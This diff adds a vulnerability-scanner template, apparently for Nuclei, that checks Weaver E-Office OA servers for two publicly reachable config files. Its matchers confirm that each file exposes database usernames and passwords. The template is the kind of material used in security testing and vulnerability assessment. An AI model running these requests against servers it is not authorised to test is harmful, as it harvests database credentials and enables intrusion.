@@ -1,0 +1,30 @@
+id: weaver-oa-e-office-mysql-config-info-leak
+
+info:
+  name: weaver-oa e-office mysql_config.ini info-leak
+  author: SleepingBag945
+  severity: medium
+  description: 泛微 E-Office mysql_config.ini文件可直接访问，泄漏数据库账号密码等信息
+  reference:
+    - http://wiki.peiqi.tech/wiki/oa/泛微OA/泛微OA%20E-Office%20mysql_config.ini%20数据库信息泄漏漏洞.html
+  tags: weaver,e-office,oa,info
+
+http:
+  - raw:
+      - |
+        GET /mysql_config.ini HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+  - raw:
+      - |
+        GET /building/backmgr/urlpage/mobileurl/configfile/jx2_config.ini HTTP/1.1
+        Host: {{Hostname}}
+
+    req-condition: true
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_1 == 200 && contains(body_1, "dataurl") && contains(body_1,"datapassword") && contains(body_1, "datauser")'
+          - 'status_code_2 == 200 && contains(body_2,"sip") && contains(body_2,"sdbuser") && contains(body_2,"sdbpassword")'
+        condition: or
